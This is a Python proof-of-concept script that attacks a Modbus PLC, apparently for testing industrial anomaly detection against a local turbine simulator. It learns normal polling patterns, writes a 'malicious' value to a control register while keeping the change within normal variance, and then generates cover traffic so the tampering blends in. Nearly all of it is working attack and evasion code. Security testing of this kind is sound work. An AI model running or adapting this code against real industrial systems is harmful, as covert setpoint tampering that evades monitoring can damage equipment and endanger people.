#!/usr/bin/env python3
"""
Proof of Concept: Anomaly Detection Bypass Test
Tests whether attacks can blend with normal traffic patterns
"""

import time
from datetime import datetime
from typing import Any, Dict, List, Optional

from pymodbus.client import ModbusTcpClient

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    "plc": {
        "ip": "127.0.0.1",
        "port": 502,
    },
    "normal_patterns": {
        "hmi_poll_interval": 1.0,
        "typical_read_size": 15,
        "typical_write_size": 3,
        "business_hours": (9, 17),
        "operational_variance": 50,
    },
    "attack": {
        "target_register": 1000,
        "normal_value": 1500,
        "malicious_value": 1490,
        "learning_cycles": 5,
        "post_attack_monitoring": 10,
    },
}


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================


def is_business_hours() -> bool:
    current_hour = datetime.now().hour
    start_hour, end_hour = CONFIG["normal_patterns"]["business_hours"]
    return start_hour <= current_hour < end_hour


def log_traffic_pattern(operation: str, details: dict[str, Any]) -> None:
    timestamp = datetime.now().isoformat()
    print(f"[{timestamp}] {operation}: {details}")


# ============================================================================
# CONNECTION & SAFE IO
# ============================================================================


def connect_to_plc(ip: str, port: int) -> ModbusTcpClient | None:
    try:
        client = ModbusTcpClient(ip, port=port)
        if client.connect():
            print(f"[*] Connected to PLC at {ip}:{port}")
            return client
        print(f"[!] Failed to connect to {ip}:{port}")
        return None
    except ConnectionRefusedError as exc:
        print(f"[!] Connection refused: {exc}")
        return None
    except OSError as exc:
        print(f"[!] Network error: {exc}")
        return None
    except Exception as exc:
        print(f"[!] Unexpected connection error: {exc}")
        return None


def read_registers_safely(
    client: ModbusTcpClient,
    address: int,
    count: int,
) -> list[int] | None:
    try:
        result = client.read_holding_registers(address, count)  # type: ignore[arg-type]
        if result is None or result.isError():
            print(f"[!] Modbus read error at {address}")
            return None
        return result.registers
    except AttributeError as exc:
        print(f"[!] Invalid client or result: {exc}")
        return None
    except Exception as exc:
        print(f"[!] Unexpected read error: {exc}")
        return None


def write_register_safely(
    client: ModbusTcpClient,
    address: int,
    value: int,
) -> bool:
    try:
        result = client.write_register(address, value)  # type: ignore[arg-type]
        if result is None or result.isError():
            print(f"[!] Modbus write error at {address}")
            return False
        return True
    except AttributeError as exc:
        print(f"[!] Invalid client or result: {exc}")
        return False
    except Exception as exc:
        print(f"[!] Unexpected write error: {exc}")
        return False


# ============================================================================
# PHASES
# ============================================================================


def phase1_learn_patterns(client: ModbusTcpClient) -> dict[str, Any]:
    """Phase 1: Learn normal operational patterns

    Returns:
        Dictionary with learning results, always contains 'success' key
    """
    print("\n" + "=" * 70)
    print("[*] PHASE 1: Learning Normal Operations")
    print("=" * 70)

    patterns: dict[str, Any] = {
        "observed_values": [],
        "success": False,
    }

    success_count = 0

    for cycle in range(CONFIG["attack"]["learning_cycles"]):
        registers = read_registers_safely(
            client,
            CONFIG["attack"]["target_register"],
            CONFIG["normal_patterns"]["typical_read_size"],
        )

        if registers:
            patterns["observed_values"].append(registers[0])
            success_count += 1

            log_traffic_pattern(
                "Normal Read",
                {
                    "address": CONFIG["attack"]["target_register"],
                    "count": CONFIG["normal_patterns"]["typical_read_size"],
                    "value": registers[0],
                },
            )

        time.sleep(CONFIG["normal_patterns"]["hmi_poll_interval"])

    if success_count > 0:
        avg = sum(patterns["observed_values"]) / len(patterns["observed_values"])
        patterns["average_value"] = avg
        patterns["success"] = True

    return patterns


def phase2_stealthy_attack(
    client: ModbusTcpClient, learned_patterns: dict[str, Any]
) -> bool:
    """Phase 2: Perform stealthy attack using learned patterns

    Args:
        client: Connected Modbus client
        learned_patterns: Patterns from phase 1 (must not be None)

    Returns:
        True if attack succeeded, False otherwise
    """
    print("\n" + "=" * 70)
    print("[*] PHASE 2: Performing Stealthy Attack")
    print("=" * 70)

    # Use learned patterns if needed
    _ = learned_patterns  # Acknowledge parameter

    registers = read_registers_safely(
        client,
        CONFIG["attack"]["target_register"],
        CONFIG["normal_patterns"]["typical_read_size"],
    )

    if not registers:
        return False

    current = registers[0]
    target = CONFIG["attack"]["malicious_value"]
    variance = abs(current - target)

    if variance > CONFIG["normal_patterns"]["operational_variance"]:
        print("[!] Change exceeds normal variance")

    if not write_register_safely(
        client,
        CONFIG["attack"]["target_register"],
        target,
    ):
        return False

    log_traffic_pattern(
        "Engineering Write",
        {
            "address": CONFIG["attack"]["target_register"],
            "old_value": current,
            "new_value": target,
            "variance": variance,
            "business_hours": is_business_hours(),
        },
    )

    verify = read_registers_safely(client, CONFIG["attack"]["target_register"], 1)
    return bool(verify and verify[0] == target)


def phase3_maintain_cover(client: ModbusTcpClient) -> None:
    """Phase 3: Maintain cover with normal-looking traffic"""
    for _ in range(CONFIG["attack"]["post_attack_monitoring"]):
        read_registers_safely(
            client,
            CONFIG["attack"]["target_register"],
            CONFIG["normal_patterns"]["typical_read_size"],
        )
        time.sleep(CONFIG["normal_patterns"]["hmi_poll_interval"])


# ============================================================================
# MAIN TEST
# ============================================================================


def test_anomaly_bypass(plc_ip: str, plc_port: int) -> dict[str, Any]:  # type: ignore[arg-type]
    """Execute anomaly detection bypass test

    Args:
        plc_ip: Target PLC IP address
        plc_port: Target PLC Modbus port

    Returns:
        Dictionary containing test results
    """
    start = datetime.now()
    results: dict[str, Any] = {"success": False}

    client = connect_to_plc(plc_ip, plc_port)
    if not client:
        return results

    try:
        # Phase 1: Learn patterns - guaranteed to return Dict[str, Any]
        learned: dict[str, Any] = phase1_learn_patterns(client)

        # Check if learning was successful
        if not learned.get("success"):
            print("[!] Learning phase failed")
            return results

        time.sleep(2)

        # Phase 2: Execute attack - now guaranteed learned is Dict[str, Any]
        if not phase2_stealthy_attack(client, learned):
            print("[!] Attack phase failed")
            return results

        time.sleep(2)

        # Phase 3: Maintain cover
        phase3_maintain_cover(client)
        results["success"] = True

    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
        results["error"] = "User interrupted"
    except Exception as exc:
        print(f"[!] Unexpected error during test: {exc}")
        results["error"] = str(exc)
    finally:
        try:
            client.close()
            print("[*] Connection closed")
        except AttributeError:
            pass  # Client was None or already closed
        except Exception as exc:
            print(f"[!] Error closing connection: {exc}")

    results["duration_seconds"] = (datetime.now() - start).total_seconds()
    return results


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    print("[*] Anomaly Detection Bypass Test")
    print("[*] Ensure turbine_simulator.py is running\n")

    if input("Proceed? (yes/no): ").lower() in ("yes", "y"):
        result = test_anomaly_bypass(CONFIG["plc"]["ip"], CONFIG["plc"]["port"])
        print(f"\n[*] Test completed. Success: {result.get('success')}")
        if result.get("error"):
            print(f"[!] Error: {result['error']}")
    else:
        print("[*] Cancelled")
